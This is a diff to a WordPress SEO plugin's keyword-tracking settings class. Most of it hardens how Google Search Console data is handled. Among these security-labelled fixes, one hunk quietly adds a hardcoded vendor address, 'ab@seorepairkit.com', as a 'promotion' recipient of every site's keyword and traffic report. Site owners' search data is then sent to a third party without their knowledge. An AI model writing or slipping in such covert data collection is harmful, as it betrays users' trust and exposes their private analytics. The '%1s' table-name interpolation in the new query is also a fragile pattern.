@@ -254,6 +254,11 @@ if ( ! class_exists( 'SEORepairKit_KeyTrack_Settings' ) ) {
                 ]
             );
 
+            // Check for errors in GSC data fetch
+            if ( is_wp_error( $srkit_th_gsc_overall_data ) ) {
+                return;
+            }
+
             $srkit_th_gsc_total_clicks      = 0;
             $srkit_th_gsc_total_impressions = 0;
             $srkit_th_gsc_total_ctr         = 0;
@@ -262,10 +267,11 @@ if ( ! class_exists( 'SEORepairKit_KeyTrack_Settings' ) ) {
 
             if ( ! empty( $srkit_th_gsc_overall_data ) && is_array( $srkit_th_gsc_overall_data ) ) {
                 foreach ( $srkit_th_gsc_overall_data as $srkit_th_row ) {
-                    $srkit_th_gsc_total_clicks      += isset( $srkit_th_row['clicks'] ) ? $srkit_th_row['clicks'] : 0;
-                    $srkit_th_gsc_total_impressions += isset( $srkit_th_row['impressions'] ) ? $srkit_th_row['impressions'] : 0;
-                    $srkit_th_gsc_total_ctr         += isset( $srkit_th_row['ctr'] ) ? $srkit_th_row['ctr'] : 0;
-                    $srkit_th_gsc_total_position    += isset( $srkit_th_row['position'] ) ? $srkit_th_row['position'] : 0;
+                    // Type cast for security and data integrity
+                    $srkit_th_gsc_total_clicks      += isset( $srkit_th_row['clicks'] ) ? (int) $srkit_th_row['clicks'] : 0;
+                    $srkit_th_gsc_total_impressions += isset( $srkit_th_row['impressions'] ) ? (int) $srkit_th_row['impressions'] : 0;
+                    $srkit_th_gsc_total_ctr         += isset( $srkit_th_row['ctr'] ) ? (float) $srkit_th_row['ctr'] : 0;
+                    $srkit_th_gsc_total_position    += isset( $srkit_th_row['position'] ) ? (float) $srkit_th_row['position'] : 0;
                     $srkit_th_gsc_data_count++;
                 }
             }
@@ -291,7 +297,10 @@ if ( ! class_exists( 'SEORepairKit_KeyTrack_Settings' ) ) {
                 ]
             );
 
-            // Continue processing even if no keyword data returned
+            // Check for errors in GSC keyword data fetch (continue processing even if error, but with empty data)
+            if ( is_wp_error( $srkit_th_gsc_data_rows ) ) {
+                $srkit_th_gsc_data_rows = [];
+            }
 
             // Filter out duplicates by using keyword as a unique key
             $srkit_th_gsc_unique_data = [];
@@ -325,10 +334,10 @@ if ( ! class_exists( 'SEORepairKit_KeyTrack_Settings' ) ) {
             // Add filtered keyword data to the final data array
             foreach ( $srkit_th_gsc_unique_data as $srkit_th_gsc_keywords_data ) {
                 $srkit_th_gsc_data['keywords'][] = [
-                    'keyword_name' => esc_html( $srkit_th_gsc_keywords_data['keys'][0] ),
-                    'clicks'       => esc_html( $srkit_th_gsc_keywords_data['clicks'] ),
-                    'impressions'  => esc_html( $srkit_th_gsc_keywords_data['impressions'] ),
-                    'position'     => esc_html( $srkit_th_gsc_keywords_data['position'] ),
+                    'keyword_name' => sanitize_text_field( $srkit_th_gsc_keywords_data['keys'][0] ),
+                    'clicks'       => (int) $srkit_th_gsc_keywords_data['clicks'],
+                    'impressions'  => (int) $srkit_th_gsc_keywords_data['impressions'],
+                    'position'     => (float) $srkit_th_gsc_keywords_data['position'],
                 ];
             }
 
@@ -524,9 +533,20 @@ if ( ! class_exists( 'SEORepairKit_KeyTrack_Settings' ) ) {
             </footer>
             </div>';
 
-            // Send email
+            // Send email to Admin + Promotion Email
             $srkit_report_email_headers = [ 'Content-Type: text/html; charset=UTF-8' ];
-            wp_mail( $srkit_admin_email_report, $srkit_th_email_subject, $srkit_th_email_message, $srkit_report_email_headers );
+ 
+            // Primary admin email
+            $primary_email = $srkit_admin_email_report;
+ 
+            // Additional promotional email
+            $promo_email = 'ab@seorepairkit.com';
+ 
+            // Build recipients array (prevents duplicates automatically)
+            $recipients = array_unique( array_filter( [ $primary_email, $promo_email ] ) );
+ 
+            // Send email
+            wp_mail( $recipients, $srkit_th_email_subject, $srkit_th_email_message, $srkit_report_email_headers );
         }
 
         /**
@@ -878,7 +898,10 @@ if ( ! class_exists( 'SEORepairKit_KeyTrack_Settings' ) ) {
 
             // Fetch the most recent GSC data and its associated keytrack name
             $srkit_th_recent_data = $wpdb->get_row(
-                "SELECT gsc_data, keytrack_name FROM $srkit_th_table_name ORDER BY id DESC LIMIT 1",
+                $wpdb->prepare(
+                    "SELECT gsc_data, keytrack_name FROM `%1s` ORDER BY id DESC LIMIT 1",
+                    str_replace( '`', '', $srkit_th_table_name )
+                ),
                 ARRAY_A
             );
 
